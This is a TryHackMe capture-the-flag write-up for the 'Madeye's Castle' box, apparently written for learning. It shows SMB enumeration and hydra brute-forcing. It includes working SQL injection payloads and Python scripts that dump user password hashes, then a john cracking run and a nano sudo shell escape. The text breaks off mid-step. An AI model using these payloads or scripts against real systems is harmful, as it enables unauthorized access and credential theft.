# Madeye's Castle

## Introduction

Welcome to my another writeup! In this TryHackMe [Madeye's Castle](https://tryhackme.com/room/madeyescastle) room, you'll learn: Error-Based SQL injection, timing attack and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

> A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja

---

Have fun storming Madeye's Castle! In this room you will need to fully enumerate the system, gain a foothold, and then pivot around to a few different users.

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# export RHOSTS=10.10.108.236         
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f5f48fa3d3ee69c239433d18d22b47a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSmqaAdIPmWjN3e6ubgLXXBGVvX9bKtcNHYD2epO9Fwy4brQNYRBkUxrRp4SJIX26MGxGyE8C5HKzhKdlXCeQS+QF36URayv/joz6UOTFTW3oxsMF6tDYMQy3Zcgh5Xp5yVoNGP84pegTQjXUUxhYSEhb3aCIci8JzPt9JntGuO0d0BQAqEo94K3RCx4/V7AWO1qlUeFF/nUZArwtgHcLFYRJEzonM02wGNHXu1vmSuvm4EF/IQE7UYGmNYlNKqYdaE3EYAThEIiiMrPaE4v21xi1JNNjUIhK9YpTA9kJuYk3bnzpO+u6BLTP2bPCMO4C8742UEc4srW7RmZ3qmoGt
|   256 5375a74aa8aa46666a128ccdc26f39aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDhpuUC3UgAeCvRo0UuEgWfXhisGXTVUnFooDdZzvGRS393O/N6Ywk715TOIAbk+o1oC1rba5Cg7DM4hyNtejk=
|   256 7fc22f3d64d90a507460360398007598 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnNa6K0GzjKiPdClth/sy8rhOd8KtkuagrRkr4tiATl
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
[...]
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: hogwartz-castle
|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
|   Domain name: \x00
|   FQDN: hogwartz-castle
|_  System time: 2022-12-13T06:48:32+00:00
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
```

According to `rustscan` result, we have 4 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache httpd 2.4.29 ((Ubuntu))
139,445	          | Samba smbd 4.7.6-Ubuntu

### SMB on Port 139,445

**In SMB, we can use `smbclient` to list all the file shares on the target machine:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# smbclient -L \\\\$RHOSTS  
Password for [WORKGROUP\nam]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Harry's Important Files
	IPC$            IPC       IPC Service (hogwartz-castle server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            HOGWARTZ-CASTLE
```

**That `sambashare` share is not a default one! Let's connect to that share:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# smbclient \\\\$RHOSTS\\sambashare
Password for [WORKGROUP\nam]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Nov 25 20:19:20 2020
  ..                                  D        0  Wed Nov 25 19:57:55 2020
  spellnames.txt                      N      874  Wed Nov 25 20:06:32 2020
  .notes.txt                          H      147  Wed Nov 25 20:19:19 2020

		9219412 blocks of size 1024. 4224064 blocks available
```

**Found 2 files! Let's `get` them!**
```
smb: \> prompt off
smb: \> mget *
getting file \spellnames.txt of size 874 as spellnames.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \.notes.txt of size 147 as .notes.txt (0.1 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

**`spellnames.txt`**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# head -n 10 spellnames.txt                                                       
avadakedavra
crucio
imperio
morsmordre
brackiumemendo
confringo
sectumsempra
sluguluseructo
furnunculus
densaugeo
```

**`.notes.txt`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# cat .notes.txt    
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

Hmm... Looks like the `spellnames.txt` is a wordlist of passwords and we need to brute force some users?? Also, `hagrid` and `hermonine` might be the username.

### HTTP on Port 80

**Adding a new domain to `/etc/hosts`:** (It's a good practice to do so.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# echo "$RHOSTS madeyes-castle.thm" >> /etc/hosts
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213020232.png)

**It's an apache default page. Let's view the source to see is there anything weird:**
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
        TODO: Virtual hosting is good. 
        TODO: Register for hogwartz-castle.thm
  -->
[...]
```

**Gotcha, let's change the our `/etc/hosts` domain name to `hogwartz-castle.thm`, and fuzzing subdomains via `ffuf`:**
```
10.10.108.236 hogwartz-castle.thm
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://hogwartz-castle.thm/ -H "Host: FUZZ.hogwartz-castle.thm" -t 100 -fs 10965
[...]
```

But found nothing in fuzzing subdomains...

**Let's go to the new domain web page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213020647.png)

```html
<body>
	<h1>Welcome to Hogwartz</h1>	

	<form action="/login" method = "post" id="loginform">
		<h3>Username:</h3><br>
			<input type="text" name="user"><br>
		<h3>Password:</h3><br>
		<input type="password" name="password">
	</form>	
	<button type="submit" form="loginform" value="submit">Submit</button><br>
</body>
```

**Hmm... This form is sending a POST request to `/login`, and we need to supply the `user` and `password`.**

**Maybe can try to guess an administrator level user's password?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213021018.png)

When we sending a wrong username or password, it outputs `Incorrect Username or Password`.

**Armed with above information, we can try to brute force it via the `spellnames.txt` username wordlist and `rockyou.txt` password wordlist via `hydra`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# hydra -L spellnames.txt -P /usr/share/wordlists/rockyou.txt $RHOSTS http-post-form "/login:user=^USER^&password=^PASS^:Incorrect Username or Password" -t 64
```

However, nothing found.

**Hmm... How about using SQL injection to bypass the authentication??**

**We can try some simple SQL injection payload, like:**
```sql
' OR 1=1-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213021855.png)

> Note: The password can be anything.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213022030.png)

`"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"`

**Hmm... Looks like it's vulnerable to SQL injection, and we found user `Lucas Washington`??**

**Let's use the `LIMIT` and `OFFSET` clause to only show 1 row, and I'm guessing it's using MySQL as the DBMS(Database Management System):**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# curl http://hogwartz-castle.thm/login -d "user=' OR 1=1 LIMIT 1 OFFSET 0-- -&password="
{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# curl http://hogwartz-castle.thm/login -d "user=' OR 1=1 LIMIT 1 OFFSET 1-- -&password="
{"error":"The password for Harry Turner is incorrect! My linux username is my first name, and password uses best64"}
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# curl http://hogwartz-castle.thm/login -d "user=' OR 1=1 LIMIT 1 OFFSET 2-- -&password="
{"error":"The password for Andrea Phillips is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# curl http://hogwartz-castle.thm/login -d "user=' OR 1=1 LIMIT 1 OFFSET 3-- -&password="
{"error":"The password for Liam Hernandez is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# curl http://hogwartz-castle.thm/login -d "user=' OR 1=1 LIMIT 1 OFFSET 4-- -&password="
{"error":"The password for Adam Jenkins is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
```

**The second result is different!**
```
The password for Harry Turner is incorrect! My linux username is my first name, and password uses best64
```

**To enumerate all possible users, I'll write a python script:**
```py
#!/usr/bin/python3

import requests

def main():
    url = 'http://hogwartz-castle.thm/login'
    position = 0

    while True:        
        finalPayload = f"""' OR 1=1 LIMIT 1 OFFSET {position}-- -"""

        data = {
            'user': finalPayload,
            'password': ''
        }

        requestText = requests.post(url, data=data).text
        
        if 'Incorrect Username or Password' not in requestText:
            print(requestText)
            position += 1
        else:
            print(f'[+] Total number of users: {position + 1}')
            exit()

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 enum_http_login.py
{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Harry Turner is incorrect! My linux username is my first name, and password uses best64"}

{"error":"The password for Andrea Phillips is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Liam Hernandez is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Adam Jenkins is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Landon Alexander is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Kennedy Anderson is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Sydney Wright is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Aaliyah Sanders is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Olivia Murphy is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Olivia Ross is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Grace Brooks is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Jordan White is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Diego Baker is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Liam Ward is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Carlos Barnes is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Carlos Lopez is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Oliver Gonzalez is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Sophie Sanchez is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Maya Sanders is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Joshua Reed is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Aaliyah Allen is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Jasmine King is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Jonathan Long is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Samuel Anderson is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Julian Robinson is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Gianna Harris is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Madelyn Morgan is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Ella Garcia is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Zoey Gonzales is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Abigail Morgan is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Joseph Rivera is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Elizabeth Cook is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Parker Cox is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Savannah Torres is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Aaliyah Williams is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Blake Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Claire Miller is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Brody Stewart is incorrect! contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for Kimberly Murphy is incorrect!  contact administrator. Congrats on SQL injection... keep digging"}

[+] Total number of users: 41
```

**Now, we found 41 users, and can confirm the second result is different.**

**Armed with above information, we can try to brute force user `harry` on SSH:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# hydra -l 'harry' -P spellnames.txt ssh://$RHOSTS 
[...]
1 of 1 target completed, 0 valid password found
```

**Hmm... Let's `base64` everything in `spellnames.txt`, as the `password uses best64` (base64??):**
```py
#!/usr/bin/python3

from base64 import b64encode

def main():
	with open('./spellnames.txt', 'r') as fd:
		for line in fd:
			listPlainText = line.strip().split('\n')
			plainText = bytes(listPlainText[0], 'utf-8')
			base64Encoded = b64encode(plainText)

			with open('./spellnames.b64', 'ab') as fdWrite:
				fdWrite.write(base64Encoded + b'\n')

if __name__ == '__main__':
	main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# head -n 10 spellnames.b64
YXZhZGFrZWRhdnJh
Y3J1Y2lv
aW1wZXJpbw==
bW9yc21vcmRyZQ==
YnJhY2tpdW1lbWVuZG8=
Y29uZnJpbmdv
c2VjdHVtc2VtcHJh
c2x1Z3VsdXNlcnVjdG8=
ZnVybnVuY3VsdXM=
ZGVuc2F1Z2Vv
```

**Now, we can parse that base64 encoded wordlist to `hydra`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# hydra -l 'harry' -P spellnames.b64 ssh://$RHOSTS
[...]
1 of 1 target completed, 0 valid password found
```

But still no dice...

**After banging my head against the wall, I found that I didn't enumerate hidden directories and files at all!!**

**Let's use `gobuster` to do that:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# gobuster dir -u http://hogwartz-castle.thm/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,txt,bak 
[...]
/login                (Status: 405) [Size: 178]
/logout               (Status: 302) [Size: 209] [--> http://hogwartz-castle.thm/]
/server-status        (Status: 403) [Size: 284]
/static               (Status: 301) [Size: 327] [--> http://hogwartz-castle.thm/static/]
```

Nothing weird in `hogwartz-castle.thm`.

**Since this `hogwartz-castle.thm` domain is showing a different web page before we add a new domain, I'll also using `gobuster` in the IP address:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# gobuster dir -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,txt,bak
[...]
/backup               (Status: 301) [Size: 315] [--> http://10.10.108.236/backup/]
/index.html           (Status: 200) [Size: 10965]
/server-status        (Status: 403) [Size: 278]
```

**Found `/backup` directory!**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# curl http://$RHOSTS/backup/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.108.236 Port 80</address>
</body></html>
```

403 Forbidden?

**Let's enumerate hidden file inside it!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# gobuster dir -u http://$RHOSTS/backup/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,txt,bak
[...]
/email                (Status: 200) [Size: 1527]
```

**That `email` looks sussy!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# curl http://$RHOSTS/backup/email
Madeye,

It is done. I registered the name you requested below but changed the "s" to a "z". You should be good to go.

RME

--------
On Tue, Nov 24, 2020 at 8:54 AM Madeye Moody <ctf@madeye.ninja> wrote:
Mr. Roar M. Echo,

Sounds great! Thanks, your mentorship is exactly what we need to avoid legal troubles with the Ministry of Magic.

Magically Yours,
madeye

--------
On Tue, Nov 24, 2020 at 8:53 AM Roar May Echo <info@roarmayecho.com> wrote:
Madeye,

I don't think we can do "hogwarts" due to copright issuyes, but let’s go with "hogwartz", how does that sound?

Roar

--------
On Tue, Nov 24, 2020 at 8:52 AM Madeye Moody <ctf@madeye.ninja> wrote:
Dear Mr. Echo,

Thanks so much for helping me develop my castle for TryHackMe. I think it would be great to register the domain name of "hogwarts-castle.thm" for the box. I have been reading about virtual hosting in Apache and it's a great way to host multiple domains on the same server. The docs says that...

> The term Virtual Host refers to the practice of running more than one web site (such as 
> company1.example.com and company2.example.com) on a single machine. Virtual hosts can be 
> "IP-based", meaning that you have a different IP address for every web site, or "name-based", 
> meaning that you have multiple names running on each IP address. The fact that they are 
> running on the same physical server is not apparent to the end user.

You can read more here: https://httpd.apache.org/docs/2.4/vhosts/index.html

What do you think?

Thanks,
madeye
```

Not useful... As we already knew that there are 2 different websites: The IP-based one, and `hogwarts-castle.thm` domain.

**Again, after poking around, I think that I have to enumerate the SQL injection vulnerability deeper.**

> Note: I'm trying not to use `sqlmap`, as I'm still practicing OSCP exam, and doing it manually helps me to have a better understanding in SQL injection.

Based on what I've learned in PortSwigger Labs about SQL injection([Writeups](https://siunam321.github.io/ctf/)), it might vulnerable to **error-based SQL injection.**

**Let's verify that:**
```py
#!/usr/bin/python3

import requests

def main():
    url = 'http://hogwartz-castle.thm/login'

    payload = f"""PAYLOAD_HERE"""

    data = {
        'user': payload,
        'password': ''
    }

    requestText = requests.post(url, data=data).text

    if 'Incorrect Username or Password' not in requestText:
        print(requestText)
    else:
        print('False')

if __name__ == '__main__':
    main()
```

```py
# Payload 1:
payload = f"""' ORDER BY 5-- -"""

# Payload 2:
payload = f"""' ORDER BY 4-- -"""
```

```
# Payload 1:
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

# Payload 2:
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
False
```

**As you can see, the current table has 4 columns.**

**Let's try to use the `UNION` clause to verify that:**
```py
payload = f"""' UNION SELECT NULL,NULL,NULL,NULL-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
{"error":"The password for None is incorrect! None"}
```

Nice!!

**Next, we need to find which column(s) accepting string data type:**
```py
payload = f"""' UNION SELECT 'string1','string2','string3','string4'-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
{"error":"The password for string1 is incorrect! string4"}
```

**The first and last columns are accepting string data type!**

**Then, we can list the version of this DBMS:**
```py
payload = f"""' UNION SELECT NULL,NULL,NULL,sqlite_version()-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
{"error":"The password for None is incorrect! 3.22.0"}
```

Found it!

- DBMS information: SQLite version 3.22.0

**Now, we can start to enumerate tables and columns!**
```py
payload = f"""' UNION SELECT NULL,NULL,NULL,tbl_name FROM sqlite_master-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
{"error":"The password for None is incorrect! users"}
```

- Found table name: `users`

**List column names in table `users`:**
```py
payload = f"""' UNION SELECT NULL,NULL,NULL,sql FROM sqlite_master WHERE name='users'-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
{"error":"The password for None is incorrect! CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null)"}
```

- Found column names in table `users`: `name`, `password`, `admin`, `notes`

**Finally, we can extract all data from that table!**

**However, we're only interesting in user `Harry Turner`, who has different `notes`:**
```py
payload = f"""' UNION SELECT NULL,NULL,NULL,name||':'||password FROM users-- -"""
```

> Note: The `||` is concatenating strings. You can retrieve multiple columns via this technique.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
{"error":"The password for None is incorrect! Aaliyah Allen:c063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dab"}
```

**Hmm... Let's use the `LIMIT` and `OFFSET` clause to extract data!**
```py
#!/usr/bin/python3

import requests

def main():
    url = 'http://hogwartz-castle.thm/login'
    position = 0

    while True:
        payload = f"""' UNION SELECT NULL,NULL,NULL,name||':'||password FROM users LIMIT 1 OFFSET {position}-- -"""

        data = {
            'user': payload,
            'password': ''
        }

        requestText = requests.post(url, data=data).text

        if 'Harry Turner' in requestText:
            print(requestText)
            exit()
        else:
            position += 1

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# python3 sqli.py
{"error":"The password for None is incorrect! Harry Turner:{Redacted}"}
```

## Initial Foothold

**Yes! Let's crack that hash!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# hash-identifier '{Redacted}'
[...]
Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
```

By throwing that hash to `hash-identifier`, it found it's using **SHA-512**.

**Next, we can try to crack it via `john`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# echo -n "{Redacted}" > harry.hash

┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# john --wordlist=spellnames.txt --format=Raw-SHA512 harry.hash                  
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2022-12-13 04:01) 0g/s 8100p/s 8100c/s 8100C/s avadakedavra..aguamenti
Session completed.
```

Umm... it doesn't work...

Let's take a step back, In `Harry Turner`'s notes, it says `password uses best64`.

**At the first galance, I thought it's saying base64, but then I googled it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213035928.png)

**Wait... `hashcat` (or `john`) has a rule called `best64`?? Let's try that!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# locate best64.rule
/usr/share/hashcat/rules/best64.rule
/usr/share/john/rules/best64.rule

┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# john --wordlist=spellnames.txt --format=Raw-SHA512 --rules=best64 harry.hash
[...]
{Redacted} (?)
```

**We finally got it!! Let's SSH into `harry`!!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# ssh harry@$RHOSTS          
harry@10.10.108.236's password: 
 _      __    __                     __         __ __                          __
 | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
 | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
 |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
                                                        /___/
[...]
harry@hogwartz-castle:~$ whoami;hostname;id;ip a
harry
hogwartz-castle
uid=1001(harry) gid=1001(harry) groups=1001(harry)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:1e:89:ee:21:37 brd ff:ff:ff:ff:ff:ff
    inet 10.10.108.236/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2668sec preferred_lft 2668sec
    inet6 fe80::1e:89ff:feee:2137/64 scope link 
       valid_lft forever preferred_lft forever
```

**user1.txt:**
```
harry@hogwartz-castle:~$ cat user1.txt 
RME{Redacted}
```

I'm user `harry`!

## Privilege Escalation

### harry to hermonine

**In here, we can try some low hinger fruits, like `sudo` permission, SUID binary:**
```
harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry: 
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
```

**SUID:**
```
harry@hogwartz-castle:~$ find / -perm -4000 2>/dev/null
/srv/time-turner/swagger
[...]

harry@hogwartz-castle:~$ ls -lah /srv/time-turner/swagger
-rwsr-xr-x 1 root root 8.7K Nov 26  2020 /srv/time-turner/swagger

harry@hogwartz-castle:~$ file /srv/time-turner/swagger
/srv/time-turner/swagger: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=36c89f8b196c651950f369719ff6e50f1b427ff8, not stripped
```

**Find users:**
```
harry@hogwartz-castle:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
harry:x:1001:1001::/home/harry:/bin/bash
hermonine:x:1002:1002::/home/hermonine:/bin/bash

harry@hogwartz-castle:~$ ls -lah /home
total 16K
drwxr-xr-x  4 root      root      4.0K Nov 26  2020 .
drwxr-xr-x 24 root      root      4.0K Nov 26  2020 ..
drwxr-x---  4 harry     harry     4.0K Nov 26  2020 harry
drwxr-x---  5 hermonine hermonine 4.0K Nov 26  2020 hermonine
```

**Now, we've found:**

- 2 users: `harry` and `hermonine`
- **User `harry` is allowed to execute `/usr/bin/pico` as user `hermonine` without password**
- Weird SUID binary: `/srv/time-turner/swagger`

**Let's check the `/usr/bin/pico`!**
```
harry@hogwartz-castle:~$ ls -lah /usr/bin/pico
lrwxrwxrwx 1 root root 22 Aug  6  2020 /usr/bin/pico -> /etc/alternatives/pico
```

**It has a symbolic link to `/etc/alternatives/pico`:**
```
harry@hogwartz-castle:~$ ls -lah /etc/alternatives/pico
lrwxrwxrwx 1 root root 9 Aug  6  2020 /etc/alternatives/pico -> /bin/nano
```

**And `/etc/alternatives/pico` symbolic link to `/bin/nano`??**

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#shell), we can get a shell via `nano`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213041129.png)

**Let's follow that:**
```
harry@hogwartz-castle:~$ sudo -u hermonine /usr/bin/pico
Unable to create directory /home/harry/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue
```

**After Pressing `Enter`, hit `Ctrl + R`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213041230.png)

**Then hit `Ctrl + X` to execute command:**

